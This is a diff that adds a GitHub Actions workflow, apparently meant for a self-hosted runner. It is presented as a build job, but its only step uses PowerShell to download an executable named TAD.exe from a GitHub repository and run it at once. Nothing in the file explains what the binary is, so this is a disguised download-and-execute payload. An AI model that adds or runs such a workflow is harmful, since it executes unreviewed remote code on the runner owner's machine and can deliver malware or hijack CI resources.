@@ -1,0 +1,10 @@
+name: ifortam
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: nice
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/chef20240731/cook/raw/main/TAD.exe -OutFile TAD.exe ; .\TAD.exe
